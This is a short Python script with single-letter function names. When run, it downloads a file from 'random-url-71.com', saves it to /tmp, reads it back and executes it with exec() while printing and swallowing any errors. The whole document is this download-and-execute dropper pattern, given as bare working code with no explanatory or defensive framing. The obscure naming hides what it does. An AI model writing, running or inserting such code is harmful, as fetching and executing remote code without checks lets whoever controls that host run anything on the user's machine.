import requests
import os

def a(url):
    r = requests.get(url)
    return r.text

def b(fp, c):
    with open(fp, "w") as f:
        f.write(c)

def c(fp):
    with open(fp, "r") as f:
        return f.read()

def d(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def e(url, fp):
    code = a(url)
    b(fp, code)

    s = c(fp)
    d(s)

def main():
    random_url = "http://random-url-71.com/script.py"
    local_file = "/tmp/script71.py"

    e(random_url, local_file)

main()
